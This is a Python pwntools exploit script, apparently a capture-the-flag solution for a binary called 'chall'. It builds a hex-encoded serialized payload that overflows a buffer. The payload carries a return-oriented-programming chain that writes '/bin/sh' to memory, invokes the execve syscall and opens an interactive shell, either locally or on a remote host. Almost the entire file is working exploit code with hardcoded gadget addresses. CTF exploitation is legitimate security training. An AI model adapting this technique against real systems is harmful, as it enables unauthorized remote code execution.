#!/usr/bin/env python3
'''
Pwn3d by pwn2ooown
'''
from pwn import *
import sys
import time
context.log_level = "debug"
# context.terminal = ["tmux", "splitw", "-h"]
context.arch = "amd64"
def one_gadget(filename: str) -> list:
    return [
        int(i) for i in __import__('subprocess').check_output(
            ['one_gadget', '--raw', filename]).decode().split(' ')
    ]
# brva x = b *(pie+x)
# set follow-fork-mode 
# p/x $fs_base
# vis_heap_chunks
# set debug-file-directory /usr/src/glibc/glibc-2.35
# directory /usr/src/glibc/glibc-2.35/malloc/
# handle SIGALRM ignore
if len(sys.argv) == 1:
    r = process("./chall")
    if args.GDB:
        gdb.attach(r,'b *0x401bba\nc')
        # gdb.attach(r,'b *0x401b8a\nb *0x401b72\nb unserialize')
elif len(sys.argv) == 3:
    r = remote(sys.argv[1], sys.argv[2])
else:
    print("Usage: python3 {} [GDB | REMOTE_IP PORT]".format(sys.argv[0]))
    sys.exit(1)
s       = lambda data               :r.send(data)
sa      = lambda x, y               :r.sendafter(x, y)
sl      = lambda data               :r.sendline(data)
sla     = lambda x, y               :r.sendlineafter(x, y)
ru      = lambda delims, drop=True  :r.recvuntil(delims, drop)
uu32    = lambda data,num           :u32(r.recvuntil(data)[-num:].ljust(4,b'\x00'))
uu64    = lambda data,num           :u64(r.recvuntil(data)[-num:].ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))
l64     = lambda      :u64(r.recvuntil("\x7f")[-6:].ljust(8,b"\x00"))
l32     = lambda      :u32(r.recvuntil("\xf7")[-4:].ljust(4,b"\x00"))

def build_payload(length: int) -> bytes:
    return "".join([hex(i)[2:].zfill(2) for i in range(1, length+1)])

# ooo = 113

# part1 = "0"+str(ooo)+":"
# part2 = build_payload(int(str(ooo),8))
# part3 = "80" *(ooo-int(str(ooo),8)-8)
# # 0x4cc190

def convert_to_hex_string_reverse(value: int) -> str:
    ooo = p64(value)
    return "".join([hex(ooo[i])[2:].zfill(2) for i in range(len(ooo))])
payload = ""
ret = 0x40101a
pop_rax = 0x4303ab
binsh = 0x68732f6e69622f
pop_rdi_pop_rbp = 0x402418
#0x000000000042f785 : mov qword ptr [rsi], rax ; ret
mov_rax_to_rsi = 0x42f785
pop_rsi = 0x000000000043617e
blank = 0x4cc550
syscall = 0x0000000000401364
ropchain = [ret,pop_rax,binsh,pop_rsi,blank,mov_rax_to_rsi,pop_rdi_pop_rbp,blank,0,pop_rsi,0,pop_rax,0x3b,syscall]
# part4 = convert_to_hex_string_reverse(0x58ADBEEF11112222)
# sl(part1+part2+part3+part4)
payload = "".join([convert_to_hex_string_reverse(i) for i in ropchain])
assert len(payload) == 224
sl("0113:"+payload+"58")
r.interactive()